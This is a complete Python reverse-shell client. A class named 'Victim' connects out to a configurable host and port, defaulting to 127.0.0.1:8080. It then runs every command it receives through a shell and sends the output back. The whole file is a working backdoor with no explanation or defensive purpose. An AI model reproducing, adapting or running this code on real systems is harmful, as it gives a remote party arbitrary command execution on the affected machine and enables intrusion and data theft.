#!/usr/bin/env python3

import socket
import subprocess

class Victim:
            
    def __init__(self, sock=None):
        try:
            if sock is None:
                print("[~] Creating New Socket")
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                print("[+] Socket Created")
            else:
                print("[+] Socket Already Exists")
                self.sock = sock
        except Exception as sock_error:
            print(f"[!] Socket Error: {sock_error}")

    def Start_server(self, host="127.0.0.1", port=8080):
        try:
            print(f"[~] Connecting to {host}:{port}")
            self.sock.connect((host, port))
            print(f"[+] Connected to {host}:{port}")

            while True:
                command = self.sock.recv(1024)
                if not command:
                    print(f"[!] Connection Lost from {host}")
                    break
                else:                                  
                    command = subprocess.Popen(command.decode().strip(), shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
                    output_byte = command.stdout.read() + command.stderr.read()
                    self.sock.send(output_byte)
                        
        except Exception as start_server_error:
            print(f"[!] Start Server Error: {start_server_error}")
        finally:
            self.sock.close()
            print("[~] Socket Closed")

if __name__ == "__main__":
    victim = Victim()
    victim.Start_server()
